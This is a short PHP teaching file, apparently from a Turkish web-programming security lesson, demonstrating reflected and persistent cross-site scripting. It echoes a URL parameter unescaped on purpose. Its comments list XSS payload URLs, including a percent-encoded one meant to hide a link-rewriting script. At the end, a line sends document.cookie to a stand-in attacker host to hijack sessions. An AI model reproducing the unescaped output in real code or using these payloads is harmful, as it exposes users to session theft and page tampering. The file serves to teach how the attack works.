<?php
/**
 * Created by PhpStorm.
 * User: celalceken
 * Date: 07.05.2014
 * Time: 10:47
 *
 * 1. Non-Persistent XSS Attack

In case of Non-Persistent attack, it requires a user to visit the specially crafted link by the attacker. When the user visit the link, the crafted code will get executed by the user’s browser. Let us understand this attack better with an example.
 */


$name = $_GET['name'];
echo "Welcome $name<br>";
echo '<a href=" http://xssattackexamples.com?c=/">Click to Download</a>';

//http://localhost/WebProgramlama8/Guvenlik/Uygulama22.php?name=guest<script>alert('attacked')</script>
// http://localhost/WebProgramlama8/Guvenlik/Uygulama22.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://www.sakarya.edu.tr";}</script>
// Yukarıdakinin asci karşılığı yazılabilir(doğrudan anlaşılamaması için)
// index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e


//2. Persistent XSS Attack

//In case of persistent attack, the code injected by the attacker will be stored in a secondary storage device (mostly on a database). The damage caused by Persistent attack is more than the non-persistent attack. Here we will see how to hijack other user’s session by performing XSS.



?>

<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>